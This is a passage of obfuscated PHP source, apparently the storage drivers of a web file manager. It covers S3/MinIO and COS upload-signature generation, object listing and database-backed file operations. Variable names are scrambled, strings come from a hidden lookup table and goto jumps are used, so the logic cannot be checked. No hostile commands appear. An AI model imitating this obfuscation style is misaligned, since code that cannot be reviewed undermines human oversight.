gmdate($Í¼ëãÄ[280]); $“…Ñì²² = $Í¼ëãÄ[288] . $¼Èñ‰ã®; $å†ş“Ò = array($Í¼ëãÄ[289], $Í¼ëãÄ[12], $Í¼ëãÄ[121], $Í¼ëãÄ[12], "\170\55\141\x6d\172\55\144\141\x74\145\x3a{$í˜¿‘ñ}", $Í¼ëãÄ[8] . $this->bucket . $Í¼ëãÄ[8] . $this->pathEncode($­¬¦‰½Ü) . $“…Ñì²²); $šÀ’éç = implode($Í¼ëãÄ[286], $å†ş“Ò); $È‹Š˜°½ = $this->client->__getSignature($šÀ’éç); return array($Í¼ëãÄ[287] => $È‹Š˜°½, $Í¼ëãÄ[283] => $í˜¿‘ñ, $Í¼ëãÄ[290] => $•»±¼ë¦); } public function uploadPartAuthV4($ÓÅ°é”«, $Ô¢ªß°¡ = array()) { $³·ï¦“Ò =& $_SERVER[¿ÈˆÑ¸ä]; $ã°Í˜í† = $Ô¢ªß°¡[$³·ï¦“Ò[95]]; $ãƒµÎÕ’ = array($³·ï¦“Ò[274] => gmdate($³·ï¦“Ò[281]), $³·ï¦“Ò[291] => _get($Ô¢ªß°¡, $³·ï¦“Ò[292], hash($³·ï¦“Ò[276], $³·ï¦“Ò[12]))); $å‘›·®Ÿ = explode($³·ï¦“Ò[209], $this->getHost()); $í¨ö¥÷Ù = array($³·ï¦“Ò[293] => $å‘›·®Ÿ[1], $³·ï¦“Ò[294] => $³·ï¦“Ò[12], $³·ï¦“Ò[247] => $³·ï¦“Ò[121], $³·ï¦“Ò[295] => $Ô¢ªß°¡[$³·ï¦“Ò[79]]); $­²”ºÄÓ = $³·ï¦“Ò[254]; $ÁÃşş¡­ = $³·ï¦“Ò[8] . $this->pathEncode($ã°Í˜í†); $½ú Ï¶’ = array_intersect_key($Ô¢ªß°¡, array_flip(array($³·ï¦“Ò[284], $³·ï¦“Ò[282]))); $ƒ¬Ú°şâ = $this->client->__getSignatureV4($ãƒµÎÕ’, $í¨ö¥÷Ù, $­²”ºÄÓ, $ÁÃşş¡­, $½ú Ï¶’); return array($³·ï¦“Ò[287] => $ƒ¬Ú°şâ, $³·ï¦“Ò[291] => $ãƒµÎÕ’[$³·ï¦“Ò[291]], $³·ï¦“Ò[283] => $ãƒµÎÕ’[$³·ï¦“Ò[274]]); } public function uploadListAuthV4($Š³—ş°®, $›ğ‹èúÇ = array()) { $™¬ôÌ› =& $_SERVER[¿ÈˆÑ¸ä]; $›¬‡Ôç = $›ğ‹èúÇ[$™¬ôÌ›[95]]; $ÉÔ¼Ó½ú = $›ğ‹èúÇ[$™¬ôÌ›[282]]; $à˜ÃÏ¯Ş = $this->client->listParts($this->bucket, $›¬‡Ôç, $ÉÔ¼Ó½ú); if (!$à˜ÃÏ¯Ş) { return !1; } $³Æ»êİ = $™¬ôÌ›[296]; foreach ($à˜ÃÏ¯Ş as $ÚÅºîö) { $³Æ»êİ .= $™¬ôÌ›[297] . "\74\120\141\x72\x74\x4e\x75\x6d\142\x65\162\76{$ÚÅºîö[$™¬ôÌ›[298]]}\74\x2f\x50\x61\162\x74\116\165\155\142\145\x72\76\xa" . "\74\105\x54\141\x67\76{$ÚÅºîö[$™¬ôÌ›[299]]}\74\57\105\x54\x61\x67\76\12" . $™¬ôÌ›[300]; } $³Æ»êİ .= $™¬ôÌ›[301]; $™±½ë«¹ = array($™¬ôÌ›[274] => gmdate($™¬ôÌ›[281]), $™¬ôÌ›[291] => hash($™¬ôÌ›[276], $³Æ»êİ)); $ûš¤ù— = explode($™¬ôÌ›[209], $this->getHost()); $Ôñßäæá = array($™¬ôÌ›[293] => $ûš¤ù—[1], $™¬ôÌ›[247] => $™¬ôÌ›[121], $™¬ôÌ›[295] => strlen($³Æ»êİ)); $” öˆëŠ = $™¬ôÌ›[289]; $Ã‘™€—­ = $™¬ôÌ›[8] . $this->pathEncode($›¬‡Ôç); $ôŒ·€ é = array($™¬ôÌ›[282] => $ÉÔ¼Ó½ú); $Å‚Œ†ö’ = $this->client->__getSignatureV4($™±½ë«¹, $Ôñßäæá, $” öˆëŠ, $Ã‘™€—­, $ôŒ·€ é); return array($™¬ôÌ›[287] => $Å‚Œ†ö’, $™¬ôÌ›[291] => $™±½ë«¹[$™¬ôÌ›[291]], $™¬ôÌ›[283] => $™±½ë«¹[$™¬ôÌ›[274]], $™¬ôÌ›[290] => $à˜ÃÏ¯Ş); } private function _isClientAsync() { $•Æ¼ñ¼ =& $_SERVER[¿ÈˆÑ¸ä]; static $‘¾³­µı = null; if ($‘¾³­µı === null) { $Í¦µäÓÔ = isset($_REQUEST[$•Æ¼ñ¼[302]]) ? json_decode($_REQUEST[$•Æ¼ñ¼[302]], !0) : !1; $‘¾³­µı = $Í¦µäÓÔ && _get($Í¦µäÓÔ, $•Æ¼ñ¼[303]) == $•Æ¼ñ¼[304]; } return $‘¾³­µı; } public function getHost() { $Ø²¹„Ÿ„ =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÖÈŸíë = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ø²¹„Ÿ„[70], $Ø²¹„Ÿ„[64], $Ø²¹„Ÿ„[69], $Ø²¹„Ÿ„[62]))) { return $ÛÖÈŸíë . $Ø²¹„Ÿ„[8] . $this->bucket; } if ($this->osType == $Ø²¹„Ÿ„[62] && !is_domain($ÛÖÈŸíë)) { return $ÛÖÈŸíë . $Ø²¹„Ÿ„[8] . $this->bucket; } $ÛÖÈŸíë = explode($Ø²¹„Ÿ„[209], $ÛÖÈŸíë); return $ÛÖÈŸíë[0] . $Ø²¹„Ÿ„[209] . $this->bucket . $Ø²¹„Ÿ„[10] . $ÛÖÈŸíë[1]; } public function size($ğ‚ĞÌË) { $Ñ…®»·µ = $this->objectMeta($ğ‚ĞÌË); return $Ñ…®»·µ ? $Ñ…®»·µ[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function info($ÇÀ¬ÚâÓ) { if ($this->isFolder($ÇÀ¬ÚâÓ)) { return $this->folderInfo($ÇÀ¬ÚâÓ); } else { if ($this->isFile($ÇÀ¬ÚâÓ)) { return $this->fileInfo($ÇÀ¬ÚâÓ); } } return !1; } public function exist($ÉÙï—«¶) { return $this->isFile($ÉÙï—«¶) || $this->isFolder($ÉÙï—«¶); } public function isFile($ëí˜Ä€) { return !$this->isFolder($ëí˜Ä€) && $this->objectMeta($ëí˜Ä€); } public function isFolder($¥áÏš×Ù) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][178], $¥áÏš×Ù); } protected function objectMeta($ê•›–Â) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][180], $ê•›–Â); } protected function _objectMeta($ßº£ª­¸) { $¿çêˆıÁ =& $_SERVER[¿ÈˆÑ¸ä]; $ßº£ª­¸ = rtrim($ßº£ª­¸, $¿çêˆıÁ[8]); try { $¿œ‹¥ÒÊ = $this->client->getObjectInfo($this->bucket, $ßº£ª­¸); if (!isset($¿œ‹¥ÒÊ[$¿çêˆıÁ[253]]) && isset($¿œ‹¥ÒÊ[$¿çêˆıÁ[305]])) { $¿œ‹¥ÒÊ[$¿çêˆıÁ[253]] = $¿œ‹¥ÒÊ[$¿çêˆıÁ[305]]; } } catch (Exception $ŞøÕ¾ªĞ) { $¿œ‹¥ÒÊ = !1; } if (!$¿œ‹¥ÒÊ) { } return $¿œ‹¥ÒÊ; } protected function _isFolder($Úª®èµ) { $àûğ€ÍÇ =& $_SERVER[¿ÈˆÑ¸ä]; $Úª®èµ = rtrim($Úª®èµ, $àûğ€ÍÇ[8]) . $àûğ€ÍÇ[8]; if ($Úª®èµ == $àûğ€ÍÇ[12] || $Úª®èµ == $àûğ€ÍÇ[8]) { return !0; } $ˆŠõ“ğ¤ = $this->client->getBucket($this->bucket, $Úª®èµ, null, 1); if (empty($ˆŠõ“ğ¤[$àûğ€ÍÇ[237]])) { return !1; } $ñƒÏ¸½” = $ˆŠõ“ğ¤[$àûğ€ÍÇ[237]][0][$àûğ€ÍÇ[32]]; return stripos($ñƒÏ¸½”, $Úª®èµ) === 0 ? !0 : !1; if (substr($ñƒÏ¸½”, -1) == $àûğ€ÍÇ[8]) { return !0; } if (get_path_this($ñƒÏ¸½”) == get_path_this($Úª®èµ)) { return !1; } return !0; } public function listObject($ø»‰ş×) { return $this->fileList($ø»‰ş×, $_SERVER[¿ÈˆÑ¸ä][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…èÈŞóí) { $‰Êáˆõç =& $_SERVER[¿ÈˆÑ¸ä]; parent::__construct($…èÈŞóí); $this->setSignVersion($‰Êáˆõç[248]); if (!$this->region) { $this->region = $‰Êáˆõç[306]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $–§¾ßûŸ = $this->getBktRegion(); return $this->region == $–§¾ßûŸ ? !0 : !1; } public function uploadFormData($ŒÍ˜¼ü, $Õ©°ÄŒŠ = 3600) { $œ¥ë¤¬ =& $_SERVER[¿ÈˆÑ¸ä]; $ÚĞ¨ş‰Ö = $œ¥ë¤¬[230]; $è›ß‘î© = $œ¥ë¤¬[258]; $Ö…Ù¶İ = $œ¥ë¤¬[62]; $ÔÆ¸à‘’ = gmdate($œ¥ë¤¬[259]); $ÌÄ²ÄêØ = gmdate($œ¥ë¤¬[260]); $Àçª÷ÔŒ = $œ¥ë¤¬[261]; $™ƒş¡å = $Õ©°ÄŒŠ . $œ¥ë¤¬[12]; $ÃçƒõçÖ = $œ¥ë¤¬[262]; $÷ÁèØ¨× = array($this->accessKey, $ÌÄ²ÄêØ, $this->region, $Ö…Ù¶İ, $Àçª÷ÔŒ); $æï Ä¾õ = implode($œ¥ë¤¬[8], $÷ÁèØ¨×); $€‘ÀÕ‘ = array($œ¥ë¤¬[263] => gmdate($œ¥ë¤¬[264], strtotime($œ¥ë¤¬[265])), $œ¥ë¤¬[266] => array(array($œ¥ë¤¬[267] => $this->bucket), array($œ¥ë¤¬[307] => $ÚĞ¨ş‰Ö), array($œ¥ë¤¬[268], $œ¥ë¤¬[269], $œ¥ë¤¬[12]), array($œ¥ë¤¬[268], $œ¥ë¤¬[270], $œ¥ë¤¬[12]), array($œ¥ë¤¬[268], $œ¥ë¤¬[308], $œ¥ë¤¬[12]), array($œ¥ë¤¬[271] => $ÃçƒõçÖ), array($œ¥ë¤¬[272] => $æï Ä¾õ), array($œ¥ë¤¬[273] => $è›ß‘î©), array($œ¥ë¤¬[274] => $ÔÆ¸à‘’), array($œ¥ë¤¬[275] => $™ƒş¡å))); $«˜ß©´œ = base64_encode(json_encode($€‘ÀÕ‘)); $º÷€Ï“´ = hash_hmac($œ¥ë¤¬[276], $ÌÄ²ÄêØ, $œ¥ë¤¬[277] . $this->secret, !0); $³‚Ê’œ™ = hash_hmac($œ¥ë¤¬[276], $this->region, $º÷€Ï“´, !0); $ŸŒÙ¼Ìº = hash_hmac($œ¥ë¤¬[276], $Ö…Ù¶İ, $³‚Ê’œ™, !0); $‚°°°¤… = hash_hmac($œ¥ë¤¬[276], $Àçª÷ÔŒ, $ŸŒÙ¼Ìº, !0); $ˆ÷«Æ÷Û = hash_hmac($œ¥ë¤¬[276], $«˜ß©´œ, $‚°°°¤…); $š¶Á¤ëË = array($œ¥ë¤¬[247] => $œ¥ë¤¬[12], $œ¥ë¤¬[295] => $œ¥ë¤¬[12], $œ¥ë¤¬[307] => $ÚĞ¨ş‰Ö, $œ¥ë¤¬[271] => $ÃçƒõçÖ, $œ¥ë¤¬[278] => $«˜ß©´œ, $œ¥ë¤¬[309] => $æï Ä¾õ, $œ¥ë¤¬[310] => $è›ß‘î©, $œ¥ë¤¬[311] => $ÔÆ¸à‘’, $œ¥ë¤¬[312] => $™ƒş¡å, $œ¥ë¤¬[313] => $ˆ÷«Æ÷Û, $œ¥ë¤¬[207] => $this->getHost()); return $š¶Á¤ëË; } } goto FÑÙœ…†ÁÛ; DÓ™Í§÷ŞÚ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($öìËÊÊ‹) { parent::__construct($öìËÊÊ‹); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } public function uploadFormData($Û¸òÖ‚¡, $İì˜äò = 3600) { $¤óÙ¹ùö =& $_SERVER[¿ÈˆÑ¸ä]; $‰Ø²ÈÇç = $¤óÙ¹ùö[230]; $å½Ô«„ = $¤óÙ¹ùö[1460]; $©†âÙÉ¼ = $¤óÙ¹ùö[262]; $ÄÓ™Ëñ = gmdate($¤óÙ¹ùö[1461], time() + $İì˜äò); $—©¿ıé = (string) time() . $¤óÙ¹ùö[74] . (string) (time() + $İì˜äò); $¨ù¹Öù­ = array($¤óÙ¹ùö[263] => $ÄÓ™Ëñ, $¤óÙ¹ùö[266] => array(array($¤óÙ¹ùö[307] => $‰Ø²ÈÇç), array($¤óÙ¹ùö[267] => $this->bucket), array($¤óÙ¹ùö[268], $¤óÙ¹ùö[269], $¤óÙ¹ùö[12]), array($¤óÙ¹ùö[271] => $©†âÙÉ¼), array($¤óÙ¹ùö[1462] => $å½Ô«„), array($¤óÙ¹ùö[1463] => $this->accessKey), array($¤óÙ¹ùö[1464] => $—©¿ıé))); $¨ù¹Öù­ = json_encode($¨ù¹Öù­); $ô¹¼°÷ğ = hash_hmac($¤óÙ¹ùö[1460], $—©¿ıé, $this->secret); $¶ì»•Â = sha1($¨ù¹Öù­); $õ­ÌúµÇ = hash_hmac($¤óÙ¹ùö[1460], $¶ì»•Â, $ô¹¼°÷ğ); $üôÂ’´£ = array($¤óÙ¹ùö[307] => $‰Ø²ÈÇç, $¤óÙ¹ùö[271] => $©†âÙÉ¼, $¤óÙ¹ùö[278] => base64_encode($¨ù¹Öù­), $¤óÙ¹ùö[1462] => $å½Ô«„, $¤óÙ¹ùö[1463] => $this->accessKey, $¤óÙ¹ùö[1465] => $—©¿ıé, $¤óÙ¹ùö[1466] => $õ­ÌúµÇ, $¤óÙ¹ùö[207] => $this->getHost()); return $üôÂ’´£; } public function fileOutImage($¥Ú•î÷¼, $öèøªµ¼ = 250) { $ä¯ÛĞŒ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->size($¥Ú•î÷¼) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¥Ú•î÷¼, $öèøªµ¼); } $ª”âî’¡ = $this->link($¥Ú•î÷¼); $ª”âî’¡ .= $ä¯ÛĞŒ[1467] . $öèøªµ¼ . $ä¯ÛĞŒ[1468]; $this->fileOutLink($ª”âî’¡); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ªŞÎñ ¹) { $this->pathParse = $ªŞÎñ ¹; $this->model = Model($_SERVER[¿ÈˆÑ¸ä][1469]); } public function getPath($Ñ¹ŸÄ‹) { return trim($Ñ¹ŸÄ‹, $_SERVER[¿ÈˆÑ¸ä][8]); } public function pathFather($•Îœ†»ú) { $ˆâ•Ï­ª = $this->parse($•Îœ†»ú); $ˆâ•Ï­ª = $this->infoSimple($•Îœ†»ú); return $ˆâ•Ï­ª ? $ˆâ•Ï­ª[$_SERVER[¿ÈˆÑ¸ä][191]] : !1; } public function pathThis($º€Ğ³Ğ) { $õÓ¯ª = $this->infoSimple($º€Ğ³Ğ); return $õÓ¯ª ? $õÓ¯ª[$_SERVER[¿ÈˆÑ¸ä][32]] : !1; } public function getPathOuter($âõ·›‹«) { if (!$âõ·›‹«) { return $âõ·›‹«; } $ ï™ğ±– = $this->parse($âõ·›‹«); return KodIO::make($ ï™ğ±–[$_SERVER[¿ÈˆÑ¸ä][483]]); } public function copyFolderFromIO($¹Í°ŸÓ‘, $†²Ñá¼Ò, $´åã…ÊŸ, $Öì´ôƒÀ, $——®û²) { $ÌëÖ¸‰ş = $this->model->copyFolderFromIO($¹Í°ŸÓ‘, $†²Ñá¼Ò, $´åã…ÊŸ, $Öì´ôƒÀ, $——®û²); return KodIO::make($ÌëÖ¸‰ş); } public function isParentOf($üî–‚ñˆ, $·Û´¹Íô) { return $this->model->isParentOf($üî–‚ñˆ, $·Û´¹Íô); } public function mkfile($èœå‚—, $Û–›©“à = '', $¬ûî„€§ = REPEAT_RENAME) { $ ƒàİí =& $_SERVER[¿ÈˆÑ¸ä]; $ËÈÒƒ×ô = $this->parse($èœå‚—); $èœå‚— = $ËÈÒƒ×ô[$ ƒàİí[483]]; for ($ÑÊ÷ùß = 0; $ÑÊ÷ùß < count($ËÈÒƒ×ô[$ ƒàİí[1470]]); $ÑÊ÷ùß++) { $† Š˜ò = $ËÈÒƒ×ô[$ ƒàİí[1470]][$ÑÊ÷ùß]; if ($ÑÊ÷ùß == count($ËÈÒƒ×ô[$ ƒàİí[1470]]) - 1) { $èœå‚— = $this->model->mkfile($èœå‚—, $† Š˜ò, $Û–›©“à, $¬ûî„€§); break; } $èœå‚— = $this->model->mkdir($èœå‚—, $† Š˜ò, REPEAT_SKIP); } return $this->getPathOuter($èœå‚—); } public function mkdir($ş³ƒ¾‘‹, $ùçµÛ£ = REPEAT_SKIP) { $‹›Ë ´¾ =& $_SERVER[¿ÈˆÑ¸ä]; $ı˜­éäˆ = $this->parse($ş³ƒ¾‘‹); $ş³ƒ¾‘‹ = $ı˜­éäˆ[$‹›Ë ´¾[483]]; for ($ºé·‰ôæ = 0; $ºé·‰ôæ < count($ı˜­éäˆ[$‹›Ë ´¾[1470]]); $ºé·‰ôæ++) { $ŠÔ²Ë¹ = $ı˜­éäˆ[$‹›Ë ´¾[1470]][$ºé·‰ôæ]; $ş³ƒ¾‘‹ = $this->model->mkdir($ş³ƒ¾‘‹, $ŠÔ²Ë¹, $ùçµÛ£); } return $this->getPathOuter($ş³ƒ¾‘‹); } public function copyFile($·—¾£â“, $ˆëÖâğ¤, $¨Ú©éË• = REPEAT_REPLACE) { $ú„’Ëİ´ =& $_SERVER[¿ÈˆÑ¸ä]; $ÓÈ›Øïš = $this->parse($ˆëÖâğ¤); $ÔÎÕ¢Õ = $this->model->copy($·—¾£â“, $ÓÈ›Øïš[$ú„’Ëİ´[483]], $¨Ú©éË•, $ÓÈ›Øïš[$ú„’Ëİ´[87]]); return $ÔÎÕ¢Õ ? $this->getPathOuter($ÔÎÕ¢Õ) : !1; } public function moveFile($²ĞşÛµ, $İ†ßÉÚà, $õ¾İ¤áÑ = REPEAT_REPLACE) { $Éâšúæ† =& $_SERVER[¿ÈˆÑ¸ä]; $ÓÇ´õàû = $this->parse($İ†ßÉÚà); $áì˜š = $this->model->move($²ĞşÛµ, $ÓÇ´õàû[$Éâšúæ†[483]], $õ¾İ¤áÑ, $ÓÇ´õàû[$Éâšúæ†[87]]); return $áì˜š ? $this->getPathOuter($áì˜š) : !1; } public function copy($„ÍÙã, $ÁæâÚ±ß, $ÄŞŞÃ–Ê = REPEAT_REPLACE, $÷¡Óáßö = false) { $¹âº–È‡ = $this->parse($ÁæâÚ±ß); $‘Á§ßŒá = $this->model->copy($„ÍÙã, $¹âº–È‡[$_SERVER[¿ÈˆÑ¸ä][483]], $ÄŞŞÃ–Ê, $÷¡Óáßö); return $‘Á§ßŒá ? $this->getPathOuter($‘Á§ßŒá) : !1; } public function moveSameAllow() { } public function move($°´ëÇ„, $œ­Ğä—Â, $æ¿¢‹Œú = REPEAT_REPLACE, $Ğ„Ÿ—ê• = false) { $‘â¦ª—’ = $this->parse($œ­Ğä—Â); $ÖçÖ®Ò = $this->model->move($°´ëÇ„, $‘â¦ª—’[$_SERVER[¿ÈˆÑ¸ä][483]], $æ¿¢‹Œú, $Ğ„Ÿ—ê•); return $ÖçÖ®Ò ? $this->getPathOuter($ÖçÖ®Ò) : !1; } public function remove($„“­², $úğğ³ú´ = true) { return $this->model->remove($„“­², $úğğ³ú´); } public function rename($çƒèØã, $Ë´Ğü·ó) { $»çşÃÜ = $this->model->rename($çƒèØã, $Ë´Ğü·ó); return $»çşÃÜ ? $this->getPathOuter($çƒèØã) : $»çşÃÜ; } public function size($øöªŠƒ) { $‰Š¨âè´ = $this->infoSimple($øöªŠƒ); return $‰Š¨âè´ ? $‰Š¨âè´[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function infoSimple($ˆ‘Ö¸Ş„) { return $this->model->sourceInfo($ˆ‘Ö¸Ş„); } public function info($·§¼şğ‚) { return $this->infoParse($·§¼şğ‚); } public function infoAuth($œáÖÑùö) { return $this->infoParse($œáÖÑùö, !1, !0); } public function infoWithChildren($ÛÂÏ¸¡‰) { return $this->infoParse($ÛÂÏ¸¡‰, !0); } protected function infoParse($â†«‰Ğ³, $½Öç¿™æ = false, $È€µËÚë = false) { if (!$½Öç¿™æ) { return $this->model->pathInfo($â†«‰Ğ³, $È€µËÚë); } return $this->model->pathInfoMore($â†«‰Ğ³); } public function infoFullSimple($Æİ„ùƒ) { $æì§ö† =& $_SERVER[¿ÈˆÑ¸ä]; $›¹¡×»× = explode($æì§ö†[8], $Æİ„ùƒ); $Ö•Éƒì = implode($æì§ö†[8], array_splice($›¹¡×»×, 1)); return $this->model->pathInfoByPath($›¹¡×»×[0], $Ö•Éƒì); } public function infoFull($„ùíşÎ) { $¶úì‡€Ş = $this->infoFullSimple($„ùíşÎ); return is_array($¶úì‡€Ş) ? $this->model->pathInfo($¶úì‡€Ş[$_SERVER[¿ÈˆÑ¸ä][192]]) : !1; } public function hashSimple($¹ĞÊÁï) { $ªÚ…½¢ =& $_SERVER[¿ÈˆÑ¸ä]; $¦ˆ­º½† = $this->infoWithChildren($¹ĞÊÁï); return $¦ˆ­º½†[$ªÚ…½¢[168]][$ªÚ…½¢[691]]; } public function hashMd5($ÀïÃ¡Ë„) { $œ§£‡ÄÛ =& $_SERVER[¿ÈˆÑ¸ä]; $•Î¸§Èá = $this->infoWithChildren($ÀïÃ¡Ë„); return $•Î¸§Èá[$œ§£‡ÄÛ[168]][$œ§£‡ÄÛ[559]]; } public function exist($¹Òäé—í) { $Äç·’£ª =& $_SERVER[¿ÈˆÑ¸ä]; $°èûÂ•’ = $this->parse($¹Òäé—í); if (!$°èûÂ•’[$Äç·’£ª[87]]) { return $this->isFile($¹Òäé—í) || $this->isFolder($¹Òäé—í); } $¬§¤³ùÚ = array($Äç·’£ª[488] => $°èûÂ•’[$Äç·’£ª[483]], $Äç·’£ª[32] => $°èûÂ•’[$Äç·’£ª[87]]); $ùöêí‰¸ = $this->model->where($¬§¤³ùÚ)->find(); return $ùöêí‰¸ ? !0 : !1; } public function isFile($åˆÀ‰¸†) { $È–ÕÑëÜ =& $_SERVER[¿ÈˆÑ¸ä]; $ü•š’¦í = $this->infoSimple($åˆÀ‰¸†); return $ü•š’¦í && $ü•š’¦í[$È–ÕÑëÜ[496]] == $È–ÕÑëÜ[229] ? !0 : !1; } public function isFolder($…Š®º·¯) { $šÈ¬–î‚ =& $_SERVER[¿ÈˆÑ¸ä]; $Ì¤Ù÷æÃ = $this->infoSimple($…Š®º·¯); return $Ì¤Ù÷æÃ && $Ì¤Ù÷æÃ[$šÈ¬–î‚[496]] == $šÈ¬–î‚[91] ? !0 : !1; } public function listPath($¨¤¨¿ğ—, $Íè£šË = false) { $¯¯ ó¾Á =& $_SERVER[¿ÈˆÑ¸ä]; if ($¨¤¨¿ğ— == $¯¯ ó¾Á[12]) { return !1; } $¥ç‡Üñ² = array($¯¯ ó¾Á[488] => $¨¤¨¿ğ—); if ($Íè£šË) { return $this->model->listSource($¥ç‡Üñ², -1); } return $this->model->listSource($¥ç‡Üñ²); } public function has($ÁÜÌ­»ö, $ÕÙî¢¿ = false, $°¹‘Ùª = null) { $Ãæ»ÆÈÒ =& $_SERVER[¿ÈˆÑ¸ä]; $îÒ–™ï = $this->infoWithChildren($ÁÜÌ­»ö); if ($ÕÙî¢¿) { return array($Ãæ»ÆÈÒ[241] => $îÒ–™ï[$Ãæ»ÆÈÒ[241]], $Ãæ»ÆÈÒ[240] => $îÒ–™ï[$Ãæ»ÆÈÒ[240]]); } return $°¹‘Ùª ? $îÒ–™ï[$Ãæ»ÆÈÒ[241]] : $îÒ–™ï[$Ãæ»ÆÈÒ[240]]; } public function listAll($ÄéìÜ¯†) { $Û¡Âê¡â = IO::info($this->pathParse[$_SERVER[¿ÈˆÑ¸ä][87]]); if (!$Û¡Âê¡â) { return array(); } return $this->model->listAll($ÄéìÜ¯†); } public function getContent($ü§Ùß«×) { return $this->model->getContent($ü§Ùß«×); } public function setContent($âÀ³Îì, $ì‡ÎÃ¨¶ = '') { return $this->model->setContent($âÀ³Îì, $ì‡ÎÃ¨¶); } public function fileSubstr($®È¡¤¾—, $ÄÒïÍÚø, $¤Â—¤¿) { return $this->model->fileSubstr($®È¡¤¾—, $ÄÒïÍÚø, $¤Â—¤¿); } public function download($¯ñšìÕ, $—¦û¡ú¶ = '') { $£ò­ŒÄ = get_path_father($—¦û¡ú¶); $“ãù¡ı = get_path_this($—¦û¡ú¶); $¡Éâ¥ğ“ = $this->model->fileInfoGet($¯ñšìÕ); $Åâ‰é”å = IO::copy($¡Éâ¥ğ“[$_SERVER[¿ÈˆÑ¸ä][87]], $£ò­ŒÄ, !1, $“ãù¡ı); return $Åâ‰é”å; } public function setModifyTime($¹ƒçş¬, $ˆé‰µ°¥ = '') { $¾»œò¸× =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¹ƒçş¬) { return; } $this->model->where(array($¾»œò¸×[502] => $¹ƒçş¬))->save(array($¾»œò¸×[88] => $ˆé‰µ°¥)); } public function upload($»íæ¸, $ÇÖ ö¥, $ŒåÒ½ƒ = false, $²°Ö¬ÏÒ = REPEAT_REPLACE) { $Şè±Àª¯ =& $_SERVER[¿ÈˆÑ¸ä]; $ï´Ë…‰ = $this->parse($»íæ¸); $’ˆÕÁÂÎ = $this->model->addFile($ï´Ë…‰[$Şè±Àª¯[483]], $ÇÖ ö¥, $ï´Ë…‰[$Şè±Àª¯[87]], $ŒåÒ½ƒ, $²°Ö¬ÏÒ); return $this->getPathOuter($’ˆÕÁÂÎ); } public function uploadFileByID($²¯ë²½å, $ËÀ‹’Ê, $¯œ«ÄĞ) { $“´åíÎ =& $_SERVER[¿ÈˆÑ¸ä]; $ ³şšÂš = $this->parse($²¯ë²½å); $©¦Ë¼ÔĞ = $this->model->addFileByFileID($ ³şšÂš[$“´åíÎ[483]], $ËÀ‹’Ê, $ ³şšÂš[$“´åíÎ[87]], $¯œ«ÄĞ); return $this->getPathOuter($©¦Ë¼ÔĞ); } public function addFileByRemote($‡·Õ³„ô, $‘Ë‚£–ì, $ø‹Ğ¥²½ = array(), $ñù³ƒª£ = '', $·æË¹») { $ÓµÎéã¡ =& $_SERVER[¿ÈˆÑ¸ä]; $òµœ»ä = $this->parse($‡·Õ³„ô); $ñù³ƒª£ = empty($ñù³ƒª£) ? $òµœ»ä[$ÓµÎéã¡[87]] : $ñù³ƒª£; $¾÷Æ¸³Ü = $this->model->addFileByRemote($òµœ»ä[$ÓµÎéã¡[483]], $‘Ë‚£–ì, $ñù³ƒª£, $ø‹Ğ¥²½, $·æË¹»); return $this->getPathOuter($¾÷Æ¸³Ü); } public function uploadLink($Íïˆ¿Õ‚, $¬š‚€öö = 0) { $‰Ë¢Ú’ô =& $_SERVER[¿ÈˆÑ¸ä]; $¢ªçÍ× = $this->parse($Íïˆ¿Õ‚); $¸®“Êæ÷ = _get($GLOBALS[$‰Ë¢Ú’ô[7]], $‰Ë¢Ú’ô[1471]); $ßÈ‰¹ç = _get($GLOBALS[$‰Ë¢Ú’ô[7]], $‰Ë¢Ú’ô[1472]); $Æ÷“æŠË = KodIO::ioFileDriverGet($‰Ë¢Ú’ô[494] . $¢ªçÍ×[$‰Ë¢Ú’ô[483]] . $‰Ë¢Ú’ô[403]); $öÛÊ£œ® = Model($‰Ë¢Ú’ô[693])->createFileName($¢ªçÍ×[$‰Ë¢Ú’ô[87]], $Æ÷“æŠË, $¸®“Êæ÷, $ßÈ‰¹ç); return IO::uploadLink($öÛÊ£œ®, $¬š‚€öö); } public function fileNameAuto($°ŒÖ‹åÀ, $ı˜©æªú, $Ã§¬ÆÕ³ = REPEAT_REPLACE, $¸ñÀÉÒš = false) { return $this->model->fileNameAuto($°ŒÖ‹åÀ, $ı˜©æªú, $Ã§¬ÆÕ³, $¸ñÀÉÒš); } public function fileNameExist($ş¢§½, $ÈäÆéîí) { return $this->model->fileNameExist($ş¢§½, $ÈäÆéîí); } protected function _fileOut($ˆ“ˆ¬°ı, $€Åş’Ö² = false, $úŠòşƒê = false, $•ş×ØšÆ = '', $ñŸ‡³˜£ = false) { $ª“•€‡Ú =& $_SERVER[¿ÈˆÑ¸ä]; $µ€‚ÖÚ” = $this->model->sourceInfo($ˆ“ˆ¬°ı); if ($µ€‚ÖÚ”[$ª“•€‡Ú[496]] == $ª“•€‡Ú[91]) { header($ª“•€‡Ú[1473]); die; } $–Ää”® = $this->model->fileInfoGet($ˆ“ˆ¬°ı); $•ş×ØšÆ = $–Ää”®[$ª“•€‡Ú[559]] ? $–Ää”®[$ª“•€‡Ú[559]] : $•ş×ØšÆ; $ŞµõëÀ¸ = isset($GLOBALS[$ª“•€‡Ú[181]]) && is_array($GLOBALS[$ª“•€‡Ú[181]]) ? $GLOBALS[$ª“•€‡Ú[181]][$ª“•€‡Ú[32]] : $µ€‚ÖÚ”[$ª“•€‡Ú[32]]; if ($ñŸ‡³˜£) { return IO::fileOutServer($–Ää”®[$ª“•€‡Ú[87]], $€Åş’Ö², $ŞµõëÀ¸, $•ş×ØšÆ); } IO::fileOut($–Ää”®[$ª“•€‡Ú[87]], $€Åş’Ö², $ŞµõëÀ¸, $•ş×ØšÆ); } public function fileOut($ìóÍÁ·Ì, $…ç£¸¢ = false, $ÊÚ”Şİ³ = false, 